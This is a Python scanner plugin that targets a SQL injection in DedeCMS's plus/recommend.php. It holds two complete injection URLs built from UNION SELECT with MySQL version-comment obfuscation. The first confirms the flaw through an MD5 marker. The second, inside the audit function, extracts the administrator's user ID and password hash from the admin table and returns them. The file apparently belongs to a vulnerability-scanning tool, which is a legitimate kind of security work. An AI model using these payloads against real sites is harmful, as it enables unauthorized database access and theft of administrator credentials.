#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,md5(333),0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if  content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0:
            request = getRequest(url)
            response = getResponse(res)
            if ob['isstart']=='1':
                auditresult=audit(http,ob)
                if auditresult!="":
                    
                
                    list.append(getRecord(ob,url,ob['level'],detail+"验证性扫描结果：\n"+auditresult,request,response))
                else:
                    list.append(getRecord(ob,url,ob['level'],detail,request,response))
            else:
                
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dedecms_recommend.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dedecms_recommend.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
def audit(http,ob):
    try:
        
        url = "%s://%s/" % (ob['scheme'],ob['domain'])
        url += "plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        m=re.search(r"<h2>(.+?)\|(.+?)</h2>",content,re.I)
        if m:
          
            return m.group(2)
        else:
            return""
    except Exception,e:
       
        return ""
          
        
    